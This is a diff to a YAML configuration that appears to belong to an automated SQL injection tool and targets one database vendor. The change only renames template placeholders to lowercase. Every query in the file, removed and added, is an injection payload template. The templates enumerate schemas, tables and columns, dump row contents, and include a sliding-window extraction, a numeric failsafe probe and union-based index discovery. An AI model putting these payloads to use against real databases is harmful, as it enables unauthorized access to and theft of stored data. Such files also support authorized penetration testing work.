@@ -4,11 +4,11 @@ resource:
   SELECT 
       '-'
       || id
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || DATABASE()
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || user()
-      || '${TRAIL_SQL}'
+      || '${trail_sql}'
       r
   from sysinfo.VERSION
   
@@ -16,102 +16,102 @@ resource:
   database: |
    select 
        rr
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || trim(t.schemaname)
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from
            (select distinct schemaname from SCHEMAS) t,
            (select distinct schemaname from SCHEMAS) t1
        where t.schemaname >= t1.schemaname
        group by t.schemaname
-       {limit}
+       ${limit}
    ) a
    
   table: |
    select 
        rr
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || trim(t.tablename)
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from
-           (select distinct tablename from TABLES where SCHEMANAME = '${DATABASE}') t,
-           (select distinct tablename from TABLES where SCHEMANAME = '${DATABASE}') t1
+           (select distinct tablename from TABLES where SCHEMANAME = '${database}') t,
+           (select distinct tablename from TABLES where SCHEMANAME = '${database}') t1
        where t.tablename >= t1.tablename
        group by t.tablename
-       {limit}
+       ${limit}
    ) a
    
   column: |
    select 
        rr
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || trim(t.COLUMNNAME)
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr
+           || '${separator_qte_sql}0${enclose_value_sql}'rr
        from
-           (select distinct COLUMNNAME from COLUMNS where SCHEMANAME = '${DATABASE}'and TABLENAME = '${TABLE}') t,
-           (select distinct COLUMNNAME from COLUMNS where SCHEMANAME = '${DATABASE}'and TABLENAME = '${TABLE}') t1
+           (select distinct COLUMNNAME from COLUMNS where SCHEMANAME = '${database}'and TABLENAME = '${table}') t,
+           (select distinct COLUMNNAME from COLUMNS where SCHEMANAME = '${database}'and TABLENAME = '${table}') t1
        where t.COLUMNNAME >= t1.COLUMNNAME
        group by t.COLUMNNAME
-       {limit}
+       ${limit}
    ) a
    
   row: 
    query: |
     select 
         rr
-        || '${TRAIL_SQL}'
+        || '${trail_sql}'
         r
     from (
         select 
-            '${ENCLOSE_VALUE_SQL}'
+            '${enclose_value_sql}'
             || trim(t.s)
-            || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            || '${separator_qte_sql}0${enclose_value_sql}'
             rr
         from 
-            (select distinct ${FIELDS} s from ${DATABASE}.${TABLE}) t,
-            (select distinct ${FIELDS} s from ${DATABASE}.${TABLE}) t1
+            (select distinct ${fields} s from ${database}.${table}) t,
+            (select distinct ${fields} s from ${database}.${table}) t1
         where t.s >= t1.s
         group by t.s
-        {limit}
+        ${limit}
     ) a
    fields: 
-    field: trim(ifnull(chr(${FIELD}), ''))
+    field: trim(ifnull(chr(${field}), ''))
     concat: "|| '%7f' ||"
     
 strategy: 
  configuration: 
   slidingWindow: |
    select 
-       '${LEAD}'
+       '${lead}'
        ||SUBSTR(
            r,
-           ${INDEX},
+           ${index},
            1500
        )
    from (
-       ${INJECTION}
+       ${injection}
    ) x
-  limit: having count(*) between ${LIMIT} and ${LIMIT}
-  failsafe: select (1337${INDICE}7330%2b1) r from dual
+  limit: having count(*) between ${limit.value} and ${limit.value}
+  failsafe: select (1337${indice}7330%2b1) r from dual
   calibrator: |
    rpad(
-       '${CALIBRATOR_SQL}', 
+       '${calibrator_sql}', 
        1024, 
-       '${CALIBRATOR_SQL}', 
+       '${calibrator_sql}', 
        1025
    )
   limitBoundary: 1
@@ -123,6 +123,6 @@ strategy:
     - "): Invalid end of SQL statement"
     
  normal: 
-  indices: union select ${RESULT_RANGE} from (${INDICE_UNIQUE})z
-  capacity: (select '${LEAD}${INDICE}' || ${CALIBRATOR} from dual)
+  indices: union select ${result_range} from (${indice_unique})z
+  capacity: (select '${lead}${indice}' || ${calibrator} from dual)
   orderBy: order by 1337
